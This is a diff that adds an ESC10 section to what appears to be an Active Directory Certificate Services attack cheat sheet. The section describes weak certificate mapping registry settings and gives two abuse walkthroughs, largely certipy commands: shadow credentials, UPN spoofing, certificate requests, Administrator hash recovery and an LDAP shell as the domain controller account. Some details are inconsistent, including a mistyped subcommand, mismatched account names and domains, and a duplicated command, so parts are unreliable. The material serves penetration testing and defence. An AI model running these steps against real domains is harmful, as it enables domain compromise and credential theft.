@@ -378,11 +378,97 @@ Require [SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket/pul
     certipy auth -pfx administrator.pfx -domain corp.local
     # Add -domain <domain> to your command line since there is no domain specified in the certificate.
     ```
-## ESC 10 - Weak Certificate Mappings
+## ESC10 - Weak Certificate Mappings
 
 #### Explanation
 
+Two Registry key values on the DC are referred to by ESC10
+* The default value for 'CertificateMappingMethods' under 'HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel' is '0x18' ('0x8' | '0x10'), previously set to '0x1F'.  
+* The default setting for 'StrongCertificateBindingEnforcement' under 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc' is '1', previously '0'.  
 
+#### Case 1
+
+When 'StrongCertificateBindingEnforcment' is configured to '0'.
+
+#### Case 2
+
+If 'CertificateMappingMethods' includes the 'upn' bit ('0x4).  
+
+### Abuse Case 1
+
+With StrongCertificateBindingEnforcement configured as 0, an account A with 'GenericWrite' permissions can be exploited to compromise any account B.
+
+For instance, having 'GenericWrite' permissions over 'mark.bbond@mirage.htb', an attacker aims to compromise 'Administrator@corp.local'. The procedure mirrors ESC9, allowing any certificate template to be utilized.
+
+Initially, 'mark''s hash is retrieved using Shadow Credentials, exploiting the 'GenericWrite'.  
+
+```bash
+certipy shadow autho -username john@corp.local -p Passw0rd! -a Jane
+```
+Subsequently, 'Jane''s 'userPrincipalName' is altered to 'Administrator', deliberately omitting the '@corp.local' portion to avoid a constraint violation.
+
+```bash
+certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
+```
+
+Following this, a certificate enabling client authentication is requested as Jane, using the default User template.
+
+```bash
+certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
+```
+
+Jane's userPrincipalName is then reverted to its original, Jane@corp.local.
+
+```bash
+certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
+```
+
+Authenticating with the obtained certificate will yield the NT hash of Administrator@corp.local, necessitating the specification of the domain in the command due to the absence of domain details in the certificate.
+
+```bash
+certipy auth -pfx administrator.pfx -domain corp.local
+```
+### Abuse Case 2
+
+With the CertificateMappingMethods containing the UPN bit flag (0x4), an account A with GenericWrite permissions can compromise any account B lacking a userPrincipalName property, including machine accounts and the built-in domain administrator Administrator.
+
+Here, the goal is to compromise DC$@corp.local, starting with obtaining Jane's hash through Shadow Credentials, leveraging the GenericWrite.
+
+```bash
+certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
+```
+
+Jane's userPrincipalName is then set to DC$@corp.local.
+
+```bash
+certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
+```
+
+A certificate for client authentication is requested as Jane using the default User template.
+
+```bash
+certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
+```
+
+Jane's userPrincipalName is reverted to its original after this process.
+
+```bash
+certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
+```
+
+To authenticate via Schannel, Certipy’s -ldap-shell option is utilized, indicating authentication success as u:CORP\DC$.
+
+```bash
+certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
+```
+
+Through the LDAP shell, commands such as set_rbcd enable Resource-Based Constrained Delegation (RBCD) attacks, potentially compromising the domain controller.
+
+```bash
+certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
+```
+
+This vulnerability also extends to any user account lacking a userPrincipalName or where it does not match the sAMAccountName, with the default Administrator@corp.local being a prime target due to its elevated LDAP privileges and the absence of a userPrincipalName by default.
 
 ## ESC11 - Relaying NTLM to ICPR
 
